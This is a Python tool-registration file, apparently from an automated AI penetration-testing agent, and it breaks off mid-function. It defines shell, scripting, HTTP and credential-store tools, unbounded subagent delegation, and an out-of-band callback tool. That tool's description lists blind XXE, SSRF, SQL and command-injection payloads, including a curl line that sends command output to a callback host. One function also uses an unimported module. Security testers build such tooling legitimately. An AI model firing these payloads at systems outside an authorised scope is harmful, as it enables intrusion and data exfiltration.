"""内置工具 Schema 定义 + 注册入口。

纯声明式数据：_BUILTIN_TOOLS 列表将 ToolDef + 执行器配对，
init_builtin_tools() 负责批量注册到全局注册表。
"""

from __future__ import annotations

from pathlib import Path
from typing import Any, Callable

from graphpt.db.conn import open_db

from graphpt.tools.builtin import (
    _exec_read_file,
    _exec_edit_file,
    _exec_grep,
    _exec_glob,
    _exec_run_command,
    _exec_write_note,
)
from graphpt.tools.core import ToolDef, ToolExecutor, register_tool
from graphpt.tools.db_tools import exec_db_query, exec_db_write


def _exec_db_query_adapter(
    arguments: dict[str, Any],
    *,
    db_file: Any = None,
    task_id: int = 0,
    workspace_root: Any = None,
    **kwargs: Any,
) -> dict[str, Any]:
    """db_query 注册执行器：从 kwarg 取 db_file 注入到共享实现。"""
    if db_file is None:
        return {"error": "db_file not available — DB tools require agent loop context", "success": False}
    return exec_db_query(arguments, db_file=db_file, task_id=task_id, workspace_root=workspace_root)


def _exec_browser_auth_tool(
    arguments: dict[str, Any],
    **kwargs: Any,
) -> dict[str, Any]:
    """browser_auth 注册执行器：委托 core/browser.execute_browser_tool。"""
    from graphpt.core.browser import execute_browser_tool
    return execute_browser_tool(
        "browser_auth",
        dict(arguments),
        task_id=int(kwargs.get("task_id", 0) or 0),
        workspace_root=kwargs.get("workspace_root"),
        db_file=kwargs.get("db_file"),
    )


def _exec_db_write_adapter(
    arguments: dict[str, Any],
    *,
    db_file: Any = None,
    task_id: int = 0,
    **kwargs: Any,
) -> dict[str, Any]:
    """db_write 注册执行器：从 kwarg 取 db_file 注入到共享实现。"""
    if db_file is None:
        return {"error": "db_file not available — DB tools require agent loop context", "success": False}
    return exec_db_write(arguments, db_file=db_file, task_id=task_id)


def _norm_script(code: str) -> str:
    """规范化脚本正文用于相似度比对（去注释/空白/大小写）。"""
    lines = []
    for raw in str(code or "").splitlines():
        line = raw.strip()
        if not line or line.startswith(("#", "//", "'", "<!--")):
            continue
        lines.append(line.lower().replace(" ", "").replace("\t", ""))
    return "\n".join(lines)


def _script_duplicate_hint(code: str, scripts_dir, ext: str) -> str:
    """治理 K：与既有脚本的高相似度提示（昨夜 xss_test1→6 八分钟六版实锤）。

    相似度 ≥85%（正文规范化后 difflib）即提示复用既有路径，避免脚本堆积
    与同一攻击面重复重写。仅在 stdout 附加提示，不阻断执行（agent 可能
    故意跑变体）。
    """
    if not code:
        return ""
    import difflib
    norm = _norm_script(code)
    if len(norm) < 40:
        return ""
    best_path = ""
    best_ratio = 0.0
    try:
        for p in scripts_dir.glob(f"run_*{ext}"):
            try:
                if p.stat().st_size > 200_000:
                    continue
                other = _norm_script(p.read_text(encoding="utf-8", errors="replace"))
            except OSError:
                continue
            if not other:
                continue
            ratio = difflib.SequenceMatcher(None, norm, other).ratio()
            if ratio > best_ratio:
                best_ratio = ratio
                best_path = str(p)
    except OSError:
        return ""
    if best_ratio >= 0.85 and best_path:
        return (f"\n[K-提示] 脚本与 {best_path} 正文相似度 {best_ratio:.0%}——"
                "如需变体请直接编辑该文件，避免脚本堆积")
    return ""


def _exec_run_script(code: str, *, language: str = "python", timeout_s: int = 120, **_) -> dict[str, Any]:
    """run_script 执行器：写文件 → 子进程 → 完整输出。

    独立脚本引擎：绕开 Bash 的 shlex/Windows 引号地狱与编码问题，
    exploit 开发/解析脚本的正式载体（P1-⑥）。
    """
    import subprocess as _sp
    import sys as _sys
    import uuid as _uuid
    from pathlib import Path as _Path

    ext = {"python": ".py", "bash": ".sh", "node": ".js"}.get(language, ".py")
    if language == "bash" and os.name == "nt":
        return {"error": "bash 脚本请在 python 中调用 subprocess 执行（Windows 无原生 bash）",
                "success": False}
    scripts_dir = _Path(__file__).resolve().parent.parent.parent / "workspace" / "scripts"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    path = scripts_dir / f"run_{_uuid.uuid4().hex[:8]}{ext}"
    try:
        path.write_text(str(code or ""), encoding="utf-8")
    except OSError as exc:
        return {"error": f"write script failed: {exc}", "success": False}
    interp = {"python": [_sys.executable], "node": ["node"]}.get(language, [_sys.executable])
    try:
        proc = _sp.run(
            [*interp, str(path)],
            capture_output=True,
            timeout=float(timeout_s or 120),
            encoding="utf-8",
            errors="replace",
        )
    except _sp.TimeoutExpired:
        return {"error": f"timeout after {timeout_s}s", "success": False, "timed_out": True}
    except Exception as exc:  # noqa: BLE001
        return {"error": str(exc), "success": False}
    out = (proc.stdout or "") + (("\n[stderr] " + proc.stderr) if proc.stderr.strip() else "")
    if len(out) > 20000:
        out = out[:20000] + f"\n...[输出截断 {len(out)} 字符]"
    # 治理 K：高相似度脚本提示（只提示不阻断）
    hint = _script_duplicate_hint(code, scripts_dir, ext)
    if hint:
        out += hint
    return {
        "stdout": out,
        "return_code": proc.returncode,
        "script_path": str(path),
        "duplicate_hint": hint.strip() if hint else "",
        "success": proc.returncode == 0,
    }


def _exec_http_test(
    arguments: dict[str, Any],
    *,
    workspace_root: Path | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    """http_test 注册执行器：包装 graphpt/tools/http_test.py CLI。

    响应瘦身/编码守护/时序聚合由 http_test.py 内置；这里把参数映射为
    CLI 参数并截断超长输出（防止灌爆 agent 上下文）。
    """
    # 硬约束层：同 URL+参数重复请求拦截
    from graphpt.tools import guard as _guard
    _block = _guard.check_http(arguments, task_id=int(kwargs.get("task_id", 0) or 0))
    if _block:
        return {"error": "guard_blocked", "message": _block, "success": False}
    import json as _json
    import subprocess as _sp
    import sys as _sys
    import time as _time
    from pathlib import Path as _Path

    url = str(arguments.get("url", "") or "").strip()
    if not url:
        return {"error": "url required", "success": False}

    script = _Path(__file__).resolve().parent / "http_test.py"
    cmd = [_sys.executable, str(script), "--url", url]
    method = str(arguments.get("method", "GET") or "GET").strip().upper()
    if method and method != "GET":
        cmd += ["--method", method]
    data = arguments.get("data")
    if data:
        cmd += ["--data", str(data)]
    headers = arguments.get("headers")
    if headers:
        if isinstance(headers, dict):
            headers = _json.dumps(headers, ensure_ascii=False)
        cmd += ["--headers", str(headers)]
    cookies = arguments.get("cookies")
    if cookies:
        cmd += ["--cookies", str(cookies)]
    timeout = int(arguments.get("timeout", 20) or 20)
    cmd += ["--timeout", str(timeout)]
    repeat = int(arguments.get("repeat", 1) or 1)
    if repeat > 1:
        cmd += ["--repeat", str(repeat), "--delay", str(arguments.get("delay", 0.3) or 0.3)]
    if arguments.get("include_headers"):
        cmd += ["--include-headers"]
    cmd += ["--show-summary", "--response-max-lines", "80"]

    try:
        start = _time.monotonic()
        proc = _sp.run(
            cmd,
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
            timeout=timeout + 30,
            cwd=str(workspace_root) if workspace_root else None,
        )
        duration_s = round(_time.monotonic() - start, 2)
    except _sp.TimeoutExpired:
        return {"error": "timeout", "success": False, "timed_out": True}
    except Exception as exc:  # noqa: BLE001
        return {"error": str(exc), "success": False}

    out = (proc.stdout or "") + (("\n[stderr] " + proc.stderr) if proc.stderr.strip() else "")
    if len(out) > 8000:
        out = out[:8000] + f"\n...[输出截断 {len(out)} 字符]"
    return {
        "stdout": out,
        "return_code": proc.returncode,
        "duration_s": duration_s,
        "success": proc.returncode == 0,
    }


_BUILTIN_TOOLS: list[tuple[ToolDef, ToolExecutor]] = [
    (
        ToolDef(
            name="Bash",
            description="执行 shell 命令。",
            parameters={
                "type": "object",
                "properties": {
                    "command": {"type": "string"},
                    "timeout_s": {"type": "number", "default": 120},
                },
                "required": ["command"],
            },
            risk_level="high",
            needs_scope_check=False,
            approval_policy="manual_only",
        ),
        _exec_run_command,
    ),
    (
        ToolDef(
            name="browser_auth",
            description=(
                "浏览器自动化认证登录（提取登录态 Cookie 存凭据库，供后续 http_test 携带）。"
                "mode=auto 自动填表登录（需 username/password）；mode=manual 打开浏览器人工登录。"
                "参数：url 登录页地址；mode auto/manual；username/password 凭据；timeout_ms 超时。"
                "成功后返回 cookie 串，后续请求用 http_test 的 cookies 参数携带。"
            ),
            parameters={
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "登录页 URL"},
                    "mode": {"type": "string", "enum": ["auto", "manual"], "default": "auto"},
                    "username": {"type": "string", "description": "登录用户名"},
                    "password": {"type": "string", "description": "登录密码"},
                    "timeout_ms": {"type": "number", "default": 120000},
                },
                "required": ["url"],
            },
            risk_level="medium",
            needs_scope_check=False,
        ),
        _exec_browser_auth_tool,
    ),
    (
        ToolDef(
            name="http_test",
            description=(
                "统一 HTTP 发包工具（渗透测试首选，禁止裸 curl 做注入/表单/API 测试）。"
                "功能：响应瘦身防灌爆上下文、自动 charset 检测（GBK/UTF-8）、时序聚合 "
                "（--repeat 盲注用）、--show-command 输出可回放证据命令。\n"
                "参数：url 必填；method 默认 GET；data 请求体；headers JSON 字符串；"
                "cookies Cookie 串；timeout 秒；repeat 重复次数；delay 间隔秒；"
                "include_headers 是否显示响应头。"
            ),
            parameters={
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "目标 URL"},
                    "method": {"type": "string", "enum": ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS"], "default": "GET"},
                    "data": {"type": "string", "description": "请求体（表单或 JSON）"},
                    "headers": {"type": "string", "description": "JSON 格式头，如 {\"Content-Type\": \"application/json\"}"},
                    "cookies": {"type": "string", "description": "Cookie 串，如 a=1; b=2"},
                    "timeout": {"type": "number", "default": 20},
                    "repeat": {"type": "number", "default": 1, "description": "重复次数（时序/盲注测试用）"},
                    "delay": {"type": "number", "default": 0.3, "description": "重复间隔秒"},
                    "include_headers": {"type": "boolean", "default": False},
                },
                "required": ["url"],
            },
            risk_level="medium",
            needs_scope_check=True,  # SRC 域：http_test 请求目标必须落在项目授权范围（scope）
        ),
        _exec_http_test,
    ),
    (ToolDef(name="Read", description="读文件。支持 @skill/<name>、@poc/<id>、@asset/<category> 前缀引用知识库。", parameters={"type": "object", "properties": {"path": {"type": "string"}, "offset": {"type": "integer", "default": 0}, "limit": {"type": "integer", "default": 8000, "description": "读取字符数，不传则返回全文"}}, "required": ["path"]}, risk_level="low", needs_scope_check=False), _exec_read_file),
    (ToolDef(name="Write", description="写文件(覆盖/追加)。@evidence/<id> 写漏洞证据;@asset/<category> 追加资产(自动去重,mode=append)。", parameters={"type": "object", "properties": {"path": {"type": "string"}, "content": {"type": "string"}, "mode": {"type": "string", "enum": ["overwrite", "append"], "default": "overwrite"}}, "required": ["path", "content"]}, risk_level="low", needs_scope_check=False), _exec_write_note),
    # 统一 DB 查询入口:替代 search_findings/search_credentials/search_http_traffic
    (ToolDef(
        name="db_query",
        description=(
            "查任务的内置 sqlite 表。table 字段选择目标表,filter 透传到该表的过滤字段。\n"
            "- findings: 漏洞/资产/凭据等发现池。filter: {category, status, keyword, limit, offset}\n"
            "  category ∈ domain/subdomain/ip/port/url/vuln/credential/info/config/attack_path\n"
            "  status ∈ new/investigating/confirmed/dismissed\n"
            "- credentials: 已收集的用户名/密码/Token。filter: {keyword, credential_type, status, limit, offset}\n"
            "  credential_type ∈ password/token/api_key/ssh_key/cookie/hash/other\n"
            "- http_traffic: 历史 HTTP 请求/响应。filter: {url_pattern, method, status_code, status_range, body_keyword}\n"
            "  或顶层传 id 直接查单条完整记录"
        ),
        parameters={
            "type": "object",
            "properties": {
                "table": {"type": "string", "enum": ["findings", "credentials", "http_traffic"]},
                "filter": {"type": "object", "description": "按表的过滤字段,见 description"},
                "id": {"type": "integer", "description": "仅 http_traffic 用,直接查单条"},
                "limit": {"type": "integer"},
                "offset": {"type": "integer"},
            },
            "required": ["table"],
        },
        risk_level="low",
        needs_scope_check=False,
    ), _exec_db_query_adapter),
    # 统一 DB 写入入口:替代 update_finding / save_credential
    (ToolDef(
        name="db_write",
        description=(
            "写任务的内置 sqlite 表。table 选择目标表,record 为字段集。\n"
            "- findings: upsert finding。若 finding_id 匹配或 finding_title+canonical_target+category 匹配已有记录则 UPDATE,否则 INSERT 新记录。\n"
            "  record: {finding_id?, finding_title, canonical_target?, category?, status?, triage_score?, detail?, severity?, confidence?}\n"
            "  status ∈ new/investigating/confirmed/dismissed\n"
            "- credentials: 新增凭据。record: {target, username, password, credential_type, source, notes, role_label, auth_cookie_string, auth_headers, jwt_payload, session_json}\n"
            "  credential_type ∈ password/token/api_key/ssh_key/cookie/hash/session/other (默认 password)\n"
            "  role_label 角色(admin/user)；auth_cookie_string 完整 Cookie 串；auth_headers 认证头数组；\n"
            "  jwt_payload JWT 解码 payload；session_json 完整会话协议 JSON (vibe-pentest sessions 兼容)"
        ),
        parameters={
            "type": "object",
            "properties": {
                "table": {"type": "string", "enum": ["findings", "credentials"]},
                "record": {"type": "object", "description": "字段集,见 description"},
            },
            "required": ["table", "record"],
        },
        risk_level="low",
        needs_scope_check=False,
    ), _exec_db_write_adapter),
    # 独立脚本引擎：绕开 Bash 的 shlex/Windows 引号地狱与编码问题，
    # exploit 开发/解析脚本的正式载体（P1-⑥）
    (ToolDef(
        name="run_script",
        description=(
            "在隔离工作区执行一段脚本（python 默认）。脚本写入 workspace/scripts/ 后"
            "以 UTF-8 子进程运行，完整 stdout/stderr 返回（不再受 Bash 命令长度/"
            "引号转义限制）。language 支持 python / bash / node。"
            "适合：编写 exploit/PoC、解析数据、批量请求、验证脚本。"
            "返回值可含 script_path 供后续 Read。"
        ),
        parameters={
            "type": "object",
            "properties": {
                "language": {"type": "string", "enum": ["python", "bash", "node"], "default": "python"},
                "code": {"type": "string", "description": "脚本源码（完整程序，非单行）"},
                "timeout_s": {"type": "number", "default": 120},
            },
            "required": ["code"],
        },
        risk_level="high",
        needs_scope_check=False,
        approval_policy="manual_only",
    ), _exec_run_script),
]


def init_builtin_tools() -> None:
    """注册所有内置工具。"""
    for tool_def, executor in _BUILTIN_TOOLS:
        register_tool(tool_def, executor)

    # 浏览器工具已移除 — MCP playwright 提供更稳定的 browser_navigate/snapshot/click
    # from graphpt.core.browser import get_browser_tool_defs
    # for tool_def, executor in get_browser_tool_defs():
    #     register_tool(tool_def, executor)

    # B6.4: declare_progress 工具已移除。语义改为:
    # - dead_end → db_write(table="findings", record={finding_id, status:"dismissed"})
    # - pivot/done → 模型在文本里说明即可,无副作用
    # - need_help → 文本说明 "NEED_HELP: <reason>" + Write 落盘到 @evidence/

    # 多步任务待办清单(覆盖式提交,至多一项 in_progress)
    register_tool(
        ToolDef(
            name="TodoWrite",
            description="维护多步任务待办清单。3+ 步任务开工前建清单,每完成一步立即更新。覆盖式提交,至多一项 in_progress。",
            parameters={
                "type": "object",
                "properties": {
                    "todos": {
                        "type": "array",
                        "items": {
                            "type": "object",
                            "properties": {
                                "content": {"type": "string", "description": "祈使句"},
                                "status": {"type": "string", "enum": ["pending", "in_progress", "completed"]},
                                "activeForm": {"type": "string", "description": "进行中展示文案(现在进行时);留空则用 content"},
                            },
                            "required": ["content", "status"],
                        },
                    },
                },
                "required": ["todos"],
            },
            risk_level="low",
            needs_scope_check=False,
        ),
        _exec_update_todos,
    )

    # 文件操作:工作区路径校验内置,越界拦截
    register_tool(
        ToolDef(
            name="Edit",
            description="精确字符串替换。old_string 须唯一命中(或 replace_all=true)。编辑前先 Read 看原文。",
            parameters={
                "type": "object",
                "properties": {
                    "path": {"type": "string"},
                    "old_string": {"type": "string"},
                    "new_string": {"type": "string"},
                    "replace_all": {"type": "boolean", "default": False},
                },
                "required": ["path", "old_string", "new_string"],
            },
            risk_level="medium",
            needs_scope_check=False,
        ),
        _exec_edit_file,
    )
    register_tool(
        ToolDef(
            name="Grep",
            description="工作区文件内容正则搜索。返回 file:line:text。",
            parameters={
                "type": "object",
                "properties": {
                    "pattern": {"type": "string", "description": "正则"},
                    "path": {"type": "string", "default": "", "description": "起点,留空=根"},
                    "glob": {"type": "string", "default": "", "description": "文件名通配,如 '*.py'"},
                    "ignore_case": {"type": "boolean", "default": False},
                    "limit": {"type": "integer", "default": 200, "description": "返回匹配数上限"},
                },
                "required": ["pattern"],
            },
            risk_level="low",
            needs_scope_check=False,
        ),
        _exec_grep,
    )
    register_tool(
        ToolDef(
            name="Glob",
            description="按通配查找文件,如 '**/*.py'。按修改时间倒序。",
            parameters={
                "type": "object",
                "properties": {
                    "pattern": {"type": "string"},
                    "path": {"type": "string", "default": "", "description": "起点,留空=根"},
                    "limit": {"type": "integer", "default": 200, "description": "返回匹配数上限"},
                },
                "required": ["pattern"],
            },
            risk_level="low",
            needs_scope_check=False,
        ),
        _exec_glob,
    )

    # 子代理委派:子代理上下文隔离,只回传最终结论
    register_tool(
        ToolDef(
            name="Task",
            description="派生隔离上下文的子代理完成聚焦子任务。prompt 必须自包含(子代理看不到主对话)。共享工作区/范围/凭据库。可递归派子代理。",
            parameters={
                "type": "object",
                "properties": {
                    "prompt": {"type": "string", "description": "自包含任务:目标+范围+约束+期望产出"},
                    "description": {"type": "string", "description": "3-5 字短标签,可选"},
                    "max_iterations": {"type": "integer", "default": 999999, "description": "子代理最大迭代数"},
                },
                "required": ["prompt"],
            },
            risk_level="medium",
            needs_scope_check=False,
        ),
        _exec_dispatch_agent,
    )

    # OOB 回调验证：盲 SSRF/XXE/RCE/SQL 注入验证
    from graphpt.tools.builtin import _exec_oob_callback
    register_tool(
        ToolDef(
            name="oob_callback",
            description=(
                "OOB(Out-of-Band)回调验证,通过 interactsh 公共服务器中转,"
                "验证盲 SSRF/XXE/RCE/SQL 注入等无回显漏洞。\n"
                "流程: start → 启动 interactsh,获取回调域名 → "
                "generate → 为每个测试生成唯一子域名 payload → "
                "将 payload 注入目标 → poll → 检查目标是否回调 → "
                "stop → 关闭。\n"
                "目标对该域名的 DNS/HTTP/SMTP 请求会经由公共服务器中转回本地,"
                "无需本机有公网 IP。\n"
                "payload 用法示例:\n"
                "- 盲 SSRF: http://<domain_payload>/admin 注入 URL 参数\n"
                "- 盲 XXE: <!ENTITY % dtd SYSTEM 'http://<domain_payload>/evil'>\n"
                "- 盲 RCE: nslookup <domain_payload> 或 curl http://<domain_payload>/$(cmd)\n"
                "- 盲 SQL(MySQL): LOAD_FILE('\\\\\\\\<domain_payload>\\\\test')"
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["start", "poll", "stop", "generate", "status"],
                        "description": (
                            "start: 启动 interactsh 客户端,获取回调域名(支持 DNS+HTTP+SMTP)。"
                            "poll: 检查目标是否有回调记录。"
                            "stop: 关闭客户端。"
                            "generate: 生成唯一子域名 payload(如 abc123.your.oast.pro)。"
                            "status: 查看当前状态。"
                        ),
                    },
                    "server": {
                        "type": "string",
                        "default": "",
                        "description": "start 时指定自定义 interactsh 服务器,留空用公共服务器。",
                    },
                    "timeout_s": {
                        "type": "number",
                        "default": 2.0,
                        "description": "poll 时等待新交互的秒数,0=立即返回已有记录。",
                    },
                    "label": {
                        "type": "string",
                        "default": "",
                        "description": "generate 时附加可读标签(如 'ssrf-aws'),poll 结果自动关联。",
                    },
                },
                "required": ["action"],
            },
            risk_level="high",
            needs_scope_check=False,
        ),
        _exec_oob_callback,
    )

    # Neo4j 图查询工具（Agent 读图分析）
    from graphpt.tools.graph_tools import init_graph_tools
    init_graph_tools()

    # Neo4j 图写入工具（Agent 与采集链单一事实源融合）
    from graphpt.tools.graph_write_tools import init_graph_write_tools
    init_graph_write_tools()


# TodoWrite 式任务清单：每次调用提交「完整」清单，覆盖式更新。
_TODO_STATUSES = ("pending", "in_progress", "completed")


def _exec_update_todos(
    arguments: dict[str, Any],
    *,
    task_id: int = 0,
    **kwargs: Any,
) -> dict[str, Any]:
    """更新当前任务清单（TodoWrite 式）。

    模型每次提交「完整」清单（覆盖式，而非增量），系统校验后回显归一化清单，
    并通过 SSE 推 todo_updated 事件给 CLI 渲染。清单本身不在服务端落库——
    它随对话历史天然续存（模型每轮带着上次的清单再改），符合 Claude Code 语义。

    校验：
    - todos 必须是数组；每项含非空 content + 合法 status；
    - 至多一项 in_progress（Claude Code 同款约束，避免"并行假象"）。
    """
    raw = arguments.get("todos")
    if not isinstance(raw, list):
        return {"success": False, "error": "invalid_todos", "message": "todos 必须是数组"}

    todos: list[dict[str, Any]] = []
    for idx, item in enumerate(raw):
        if not isinstance(item, dict):
            return {"success": False, "error": "invalid_item", "message": f"第 {idx + 1} 项不是对象"}
        content = str(item.get("content", "")).strip()
        if not content:
            return {"success": False, "error": "empty_content", "message": f"第 {idx + 1} 项 content 为空"}
        status = str(item.get("status", "pending")).strip().lower()
        if status not in _TODO_STATUSES:
            return {"success": False, "error": "invalid_status", "message": f"第 {idx + 1} 项 status 非法（须为 pending/in_progress/completed）"}
        active_form = str(item.get("activeForm", "")).strip() or content
        todos.append({"content": content, "status": status, "activeForm": active_form})

    in_progress = [t for t in todos if t["status"] == "in_progress"]
    if len(in_progress) > 1:
        return {"success": False, "error": "multiple_in_progress", "message": f"同时只能有一项 in_progress，当前有 {len(in_progress)} 项"}

    counts = {s: sum(1 for t in todos if t["status"] == s) for s in _TODO_STATUSES}
    if task_id:
        try:
            from graphpt.core.sse import sse_publish
            sse_publish(task_id, {"type": "todo_updated", "todos": todos, "counts": counts})
        except Exception:  # noqa: BLE001 — 渲染推送失败不应中断工具
            pass

    return {
        "success": True,
        "todos": todos,
        "counts": counts,
        "message": f"任务清单已更新：{counts['completed']}/{len(todos)} 完成",
    }


# 子代理无工具黑名单
_SUBAGENT_EXCLUDED_TOOLS: frozenset[str] = frozenset()
# 子代理总时间盒（2026-08-31）：嵌套 loop 无独立超时时的兜底看门狗阈值。
# 实测长探测子代理可静默跑 15 分钟（如 xss-injection 全站 XSS 测试），
# 阈值取 1800s（30 分钟）——兜底切断"真死循环"，不误杀长任务。
_SUBAGENT_TIMEOUT_S = 1800


def _build_predefined_subagents() -> dict[str, str]:
    """预定义子代理注册表：任务型（4）+ 领域专家型（8）。

    description 匹配时自动注入完整任务模板（主代理 prompt 只带本次上下文）。
    """
    _map: dict[str, str] = {}
    try:
        from graphpt.core.subagent_prompts import (
            TARGET_MODELER_TASK,
            SCAN_TRIAGE_TASK,
            SOURCE_AUDIT_TASK,
            EXPLOIT_RESEARCH_TASK,
        )
        _map.update({
            "target_modeler": TARGET_MODELER_TASK,
            "scan_triage": SCAN_TRIAGE_TASK,
            "source_audit": SOURCE_AUDIT_TASK,
            "exploit_research": EXPLOIT_RESEARCH_TASK,
        })
        # 领域专家子代理（vibe-pentest 方法论）:
        # description=injection/auth/file/api/business/misc/poc/chain →
        # 自动注入领域模板（角色身份/职责范围/白帽操守/执行策略/反幻觉/输出协议）
        from graphpt.core.domain_agent_templates import DOMAIN_AGENT_TEMPLATES
        _map.update(DOMAIN_AGENT_TEMPLATES)
    except ImportError:
        pass
    return _map


def _exec_dispatch_agent(
    arguments: dict[str, Any],
    *,
    workspace_root: Path | None = None,
    db_file: Any = None,
    task_id: int = 0,
    stop_event: Any = None,
    **kwargs: Any,
) -> dict[str, Any]:
    """派生隔离上下文的子代理执行一个聚焦子任务（对齐 Claude Code 的 Task）。

    子代理有自己独立的对话历史与受限工具集，跑一个嵌套 run_agent_loop，
    只把最终文字结论回传给主代理，从而保护主上下文不被中间过程淹没。


    ai_config 等运行上下文不由工具分发器注入，故从 run_agent_loop 在入口挂的
    contextvar（get_agent_run_context）读取。dispatch_agent 只走串行路径，
    必然与挂 contextvar 的 loop 同线程，因此可见。
    """
    from graphpt.core.agent_loop import (
        get_agent_run_context,
        run_agent_loop,
    )
    from graphpt.tools.core import get_all_tool_schemas

    prompt = str(arguments.get("prompt", "")).strip()
    if not prompt:
        return {"success": False, "error": "prompt_required", "message": "必须提供 prompt（要委派给子代理的任务描述）"}
    description = str(arguments.get("description", "")).strip()

    ctx = get_agent_run_context()
    if not ctx or ctx.get("ai_config") is None:
        return {"success": False, "error": "no_agent_context", "message": "dispatch_agent 只能在 agent 循环内调用"}

    depth = int(ctx.get("depth", 0))

    try:
        max_iterations = int(arguments.get("max_iterations", 999999))
    except (TypeError, ValueError):
        max_iterations = 999999

    sub_tools = [
        schema
        for schema in get_all_tool_schemas()
        if schema.get("function", {}).get("name") not in _SUBAGENT_EXCLUDED_TOOLS
    ]

    sub_system_prompt = (
        "你是主代理派生的子代理（sub-agent），负责独立完成一个聚焦的子任务。\n"
        "你有自己独立的对话历史和工具集，但与主代理共享同一工作区、目标范围与凭据库。\n"
        "围绕委派任务自主使用工具推进，完成后用简洁中文给出关键发现、产出文件路径和后续建议。"
        "必要时可再派生子代理分解工作。"
    )

    # B8: 预定义子代理类型 → 自动注入完整任务模板。主代理 prompt 不再嵌入 5K 字符模板,
    # 只需在 description 选类型,本次具体上下文走 prompt 参数。
    _PREDEFINED_SUBAGENTS = _build_predefined_subagents()

    desc_key = description.strip().lower()
    if desc_key in _PREDEFINED_SUBAGENTS:
        sub_system_prompt += "\n\n" + _PREDEFINED_SUBAGENTS[desc_key].strip()
    elif description:
        sub_system_prompt += f"\n任务标签：{description}"

    # 领域骨架注入：程序生成"必测类型 + 攻击面"清单，强制子代理逐项覆盖
    # （对齐 vibe-pentest findings 骨架协议 — 该测的必须测）
    # asset_id 通过 session_role 传递（格式 "graph_agent:{asset_id}"）
    try:
        from graphpt.core.findings_skeleton import build_skeleton_prompt
        _role = str(ctx.get("session_role") or "")
        _aid = _role.split(":", 1)[1] if ":" in _role else ""
        _skeleton = build_skeleton_prompt(desc_key, _aid)
        if _skeleton:
            sub_system_prompt += "\n\n" + _skeleton
    except Exception:  # noqa: BLE001
        pass

    # 进度回灌：子代理与父 loop 同线程，从 contextvar 取 UI 进度回调（CLI 状态栏）。
    # 给子 run_agent_loop 挂一个只计数的 HookManager：每次子工具完成 → 递增主状态栏
    # 的「子代理 N 工具」，让委派期间看得出子代理在动、没卡死。无 UI（如 web 路径）则为 None。
    from graphpt.core.agent_loop import get_agent_on_status, get_subagent_progress_cb
    from graphpt.core.hooks import HookManager

    progress = get_subagent_progress_cb()
    # 父代理 on_status callback：wrap 一下加 ↳ 前缀，让子代理状态行可视化区分。
    _parent_status = get_agent_on_status()
    # label 优先用 description；缺省时取 prompt 首 20 字符（去换行/空白），
    # 让并行多个子代理能在状态行区分开。
    if description:
        sub_label = description
    else:
        _trimmed = " ".join(prompt.split())[:20]
        sub_label = _trimmed or "子代理"

    sub_hooks = None
    if progress or _parent_status is not None:
        sub_hooks = HookManager()
        if progress:
            sub_hooks.on("tool_call", lambda _ev: progress["tool"]())
            try:
                progress["begin"]()
            except Exception:  # noqa: BLE001 — 进度仅为观测，失败不应影响委派
                pass
        if _parent_status is not None:
            # 把子代理的工具调用透传到主状态行
            def _on_sub_tool(ev: Any, *, _label: str = sub_label, _cb: Callable[[str], None] = _parent_status) -> None:
                try:
                    tn = (ev.data or {}).get("tool_name") if hasattr(ev, "data") else None
                    if tn:
                        _cb(f"↳ [{_label}] → {tn}")
                except Exception:  # noqa: BLE001
                    pass
            sub_hooks.on("tool_call", _on_sub_tool)

    sub_on_status: Callable[[str], None] | None = None
    if _parent_status is not None:
        def _sub_status(msg: str, *, _label: str = sub_label, _cb: Callable[[str], None] = _parent_status) -> None:
            try:
                _cb(f"↳ [{_label}] {msg}")
            except Exception:  # noqa: BLE001
                pass
        sub_on_status = _sub_status
        # 委派开始的可视化标记
        try:
            _parent_status(f"↳ 派发子代理: {sub_label}")
        except Exception:  # noqa: BLE001
            pass

    # 输出协议强制（user prompt 层 — dsv4flash 遵循 user prompt 明确指令，
    # 无视 system prompt 协议文本。测试证明：指令写进 user prompt 就会被执行）
    if desc_key:
        prompt = (str(prompt).rstrip() +
                  "\n\n【输出协议 — 必须遵守】\n"
                  f"1) 测试确认的每个漏洞，必须用 Write 工具写入 findings/{desc_key}.json：\n"
                  '   path = findings/' + desc_key + '.json，content = JSON 数组，每条格式：\n'
                  '   {"url": "...", "vuln_type": "<枚举值: sqli/xss/idor/csrf/lfi/ssrf/'
                  'business-logic/info-leak/privilege-escalation/...>", "title": "...", '
                  '"severity": "critical/high/medium/low/info", "confidence": "confirmed", "detail": "..."}\n'
                  "2) 测过判定不存在的类型无需写入；\n"
                  "3) 全部测试完成后，把发现摘要回传主代理。\n"
                  "【结束条件】不写入 findings 文件不算完成任务——主代理会检查该文件是否存在。")

    # 子代理执行刚性门禁：每轮迭代注入"完成标准"检查（findings 文件是否已写）。
    # 文件存在是程序可判定的完成标志 — 不依赖 LLM 自觉，无法早退。
    _findings_path = None
    if workspace_root is not None and desc_key:
        try:
            _findings_path = Path(workspace_root) / "findings" / f"{desc_key}.json"
        except Exception:  # noqa: BLE001
            _findings_path = None

    _sub_iter_count = {"n": 0}  # 子代理迭代计数（引导收敛，防完美主义陷阱）

    def _sub_steering() -> list[str]:
        msgs: list[str] = []
        _sub_iter_count["n"] += 1
        if _findings_path is not None and not _findings_path.exists():
            if _sub_iter_count["n"] > 25:
                # 深度探索已完成：引导立即写文件收敛（避免"没测完就一直测"卡死）
                msgs.append(
                    "【立即收尾】你已充分测试（超过 25 轮迭代）。现在必须用 Write 工具写入 "
                    "findings/%(d)s.json（JSON 数组：url/vuln_type/title/severity/confidence/detail），"
                    "把你已确认的所有漏洞写入该文件，然后立即结束任务。不要再继续测试。" % {"d": desc_key}
                )
            else:
                msgs.append(
                    "【完成标准未达成】你尚未写入 findings 文件（路径 findings/%(d)s.json）。"
                    "继续逐项测试必测清单中的类型，把确认的漏洞写入该文件"
                    "（JSON 数组：url/vuln_type/title/severity/confidence/detail）；"
                    "测过判定不存在的类型无需写入。测试到主要攻击面覆盖后即可写文件结束，"
                    "不必穷尽每个参数变体。" % {"d": desc_key}
                )
        return msgs

    try:
        # 子代理总时间盒看门狗（2026-08-31）：嵌套 loop 原本无独立超时——
        # 子代理卡死在某次调用时整个主线程陪死且无兜底（testfire 挖洞三次
        # 卡死死活均在派发子代理之后，日志静默/CPU 0）。设独立 sub_stop：
